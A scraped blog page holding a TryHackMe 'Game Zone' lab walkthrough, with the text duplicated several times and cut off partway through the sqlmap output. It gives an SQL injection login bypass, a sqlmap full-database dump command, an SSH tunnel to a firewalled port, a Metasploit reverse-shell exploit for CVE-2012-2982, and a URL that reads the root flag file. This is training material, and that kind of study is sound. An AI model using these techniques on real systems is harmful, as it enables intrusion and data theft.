<meta name="description" content="This is a walkthrough of the Tryhackme room called “Game Zone”. Ths description of this room states This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. This THM room doesn’t ask to run NMap scans or any of the initial enumeration so we will start by going directly to the site. The Game Zone Website Navigating to the site in a browser, we see a website called Game Zone. There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin. SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- - The room says that the site doesn’t have any user called admin but the above query works and brings you to a portal page at portal.php. Using SQLMap The next thing to do is to dump the SQL database using SQLMap. The room directs you to intercept a search request using BurpSuite which is what I did and got back the following. POST /portal.php HTTP/1.1 Host: 10.10.108.67 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 17 Origin: http://10.10.108.67 Connection: close Referer: http://10.10.108.67/portal.php Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5 Upgrade-Insecure-Requests: 1 searchitem=testing This was then saved to a file called sqlrequest.txt. By the way, it is also possible to view the request using the developer tools in Firefox from the Network tab. After capturing the request, we then feed this into SQLmap sqlmap -r sqlrequest.txt -dbms mysql -dump where -r : use the intercepted request -dbms : what database we are dealing with -dump : dump the entire database.

The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges. I discovered that navigating to http://127.0.0.1:10000/file/show.cgi/root/root.txt would also display the flag. Conclusion This was an intersting room to try. I had never used the SSH tunnel method before. I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall." />

SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- - The room says that the site doesn’t have any user called admin but the above query works and brings you to a portal page at portal.php. Using SQLMap The next thing to do is to dump the SQL database using SQLMap. The room directs you to intercept a search request using BurpSuite which is what I did and got back the following. POST /portal.php HTTP/1.1 Host: 10.10.108.67 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 17 Origin: http://10.10.108.67 Connection: close Referer: http://10.10.108.67/portal.php Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5 Upgrade-Insecure-Requests: 1 searchitem=testing This was then saved to a file called sqlrequest.txt.

The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges. I discovered that navigating to http://127.0.0.1:10000/file/show.cgi/root/root.txt would also display the flag. Conclusion This was an intersting room to try. I had never used the SSH tunnel method before. I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall." />

There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin. SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- - The room says that the site doesn’t have any user called admin but the above query works and brings you to a portal page at portal.php. Using SQLMap The next thing to do is to dump the SQL database using SQLMap. The room directs you to intercept a search request using BurpSuite which is what I did and got back the following. POST /portal.php HTTP/1.1 Host: 10.10.108.67 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 17 Origin: http://10.10.108.67 Connection: close Referer: http://10.10.108.67/portal.php Cookie: PHPSESSID=suepevsj6e11r9tko2ggj5q8q5 Upgrade-Insecure-Requests: 1 searchitem=testing This was then saved to a file called sqlrequest.txt.

The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges. I discovered that navigating to http://127.0.0.1:10000/file/show.cgi/root/root.txt would also display the flag. Conclusion This was an intersting room to try. I had never used the SSH tunnel method before. I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/tryhackme/2021/02/21/tryhackme-game-zone.html"},"@context":"https://schema.org"}</script>

  <div class="post-content e-content" itemprop="articleBody">
    <p>This is a walkthrough of the Tryhackme room called “Game Zone”.</p>

<p>Ths description of this room states</p>

<blockquote>
  <p>This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.</p>
</blockquote>

<p>This THM room doesn’t ask to run NMap scans or any of the initial enumeration so we will start by going directly to the site.</p>

<h2 id="the-game-zone-website">The Game Zone Website</h2>

<p>Navigating to the site in a browser, we see a website called Game Zone.</p>

<p><img src="/assets/img/2021-02-21_9-13-48.jpg" alt="" /></p>

<p>There is a User Login panel on the left side so this looks like a good place to attack so we try to login as admin.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -
</code></pre></div></div>
<p>The room says that the site doesn’t have any user called admin but the above query works and brings you to a portal page at portal.php.</p>

<p><img src="/assets/img/2021-02-21_9-23-43.jpg" alt="" /></p>

<h2 id="using-sqlmap">Using SQLMap</h2>

<p>The next thing to do is to dump the SQL database using SQLMap.</p>

<p>The room directs you to intercept a search request using BurpSuite which is what I did and got back the following.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /portal.php HTTP/1.1
Host: 10.10.108.67

searchitem=testing
</code></pre></div></div>

<p>This was then saved to a file called sqlrequest.txt.</p>

<p>By the way, it is also possible to view the request using the developer tools in Firefox from the Network tab.</p>

<p>After capturing the request, we then feed this into SQLmap</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -r sqlrequest.txt -dbms mysql -dump
</code></pre></div></div>
<p>where</p>

<p>-r : use the intercepted request</p>

<p>-dbms : what database we are dealing with</p>

<p>-dump : dump the entire database.</p>

<p>This yields the following</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(dspo6㉿kali)[~/pentest/boxes/thm/game_zone]$ sqlmap -r sqlrequest.txt -dbms mysql -dump

<p>Note that there is a TCP port 10000 open.</p>

<p>One thing that I do not understand about this room is the following statement:-</p>

<blockquote>
  <p>We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list).</p>
</blockquote>

<p>I was unable to run the iptables command when logged in as agent47, presumably because that user is not root. In any case we will continue and exploit this port using an SSH tunnel.</p>

<h2 id="ssh-tunnel">SSH Tunnel</h2>

<p>Creating an SSH tunnel, will allow us to forward traffic on the port 10000 to a port on our PC.</p>

<p>Now when we go to our browser and navigate to the site with port 10000 we see a login page.</p>

<p><strong>Note:</strong> The first few times, I tried this I was not able to view this page. It turned out that I still have the proxy for Burpsuite enabled in the browser - lesson learned.</p>

<h2 id="escalation">Escalation</h2>

<p>Search the Exploit DB, we find <a href="https://www.exploit-db.com/exploits/21851">CVE-2012-2982</a> which turns out to be a Metasploit exploit.</p>

<p><strong>Note:</strong> During this phase, we need to leaave the tunnel open.</p>

<p>Firing up Metasploit, we can search for “CVE-2012-2982” and then use the resulting exploit. We then need to choose the payload of <code class="language-plaintext highlighter-rouge">cmd/unix/reverse</code> and enter the options.</p>

<h3 id="alternate-escalation-method">Alternate Escalation Method</h3>

<p>When I originally couldn’t get the Metapsploit exploit to work because of the wrong SSL setting, I did a bit of Googling and found some information on using the method mentioned in the Expoit DB entry.</p>

<blockquote>
  <p>The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, 
to execute arbitrary commands with root privileges.</p>
</blockquote>

<p>I discovered that navigating to <code class="language-plaintext highlighter-rouge">http://127.0.0.1:10000/file/show.cgi/root/root.txt</code> would also display the flag.</p>

<h2 id="conclusion">Conclusion</h2>

<p>This was an intersting room to try. I had never used the SSH tunnel method before.</p>

<p>I do wish that there was more explanation on how the decision was made to use an SSH tunnel to bypass the firewall.</p>
